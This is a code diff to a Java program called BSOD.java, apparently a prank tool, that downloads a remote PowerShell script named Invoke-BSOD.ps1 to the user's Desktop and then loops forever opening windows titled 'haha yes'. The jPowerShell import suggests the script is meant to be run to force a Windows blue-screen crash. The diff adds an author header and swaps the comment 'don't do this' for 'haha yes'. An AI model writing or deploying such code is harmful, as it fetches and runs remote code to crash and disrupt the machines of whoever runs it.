@@ -1,3 +1,10 @@
+/*
+BSOD.java made by machinesmith42
+little description thing here by Reese's Puffs
+based on code from Shit_Shit_Shit_Fuck_Shit.java by Reese's Puffs
+requires https://github.com/profesorfalken/jPowerShell/
+*/
+
 import com.profesorfalken.jpowershell.PowerShell;
 
 import javax.swing.*;
@@ -81,7 +88,7 @@ public  class BSOD implements ActionListener {
             File file = new File(System.getProperty("user.home") + "/Desktop/Invoke-BSOD.ps1");
 
             copyURLToFile(url, file);
-            while (true) { //why
+            while (true) {
                 JFrame death = new JFrame("haha yes");
                 death.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                 death.setSize(300, 300);
@@ -102,6 +109,6 @@ public  class BSOD implements ActionListener {
         public static void main(String args[]) {
             BSOD chaos = new BSOD();
             chaos.init();
-            //don't do this
+            //haha yes
         }
     }
